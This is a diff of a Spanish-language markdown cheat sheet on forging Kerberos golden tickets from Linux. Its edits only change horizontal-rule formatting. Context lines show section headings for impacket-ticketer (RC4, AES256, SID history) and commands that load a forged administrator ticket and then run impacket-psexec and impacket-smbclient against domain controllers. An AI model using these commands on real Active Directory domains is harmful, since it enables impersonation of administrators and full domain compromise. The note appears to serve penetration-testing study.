@@ -17,7 +17,7 @@ linked:
 
 # Golden Ticket - Forging Linux
 
-***
+---
 
 ## impacket-ticketer — RC4 (básico)
 
@@ -40,7 +40,7 @@ export KRB5CCNAME=administrator.ccache
 klist
 ```
 
-___
+---
 
 ## impacket-ticketer — AES256 (stealth)
 
@@ -63,7 +63,7 @@ export KRB5CCNAME=administrator.ccache
 klist
 ```
 
-___
+---
 
 ## Flags avanzados
 
@@ -89,7 +89,7 @@ impacket-ticketer \
   administrator
 ```
 
-___
+---
 
 ## Cross-domain / SID History
 
@@ -112,7 +112,7 @@ export KRB5CCNAME=administrator.ccache
 impacket-psexec -k -no-pass corp.local/administrator@dc-root.corp.local
 ```
 
-___
+---
 
 ## Verificar ticket forjado
 
@@ -135,7 +135,7 @@ impacket-smbclient -k -no-pass corp.local/administrator@dc01.corp.local
 # smb: \> ls
 ```
 
-___
+---
 
 ## Output y conversión
 
@@ -146,4 +146,4 @@ ___
 | Usar con impacket | `impacket-psexec -k -no-pass corp/administrator@DC` | Post KRB5CCNAME. |
 ^gt-forge-output
 
-***
+---
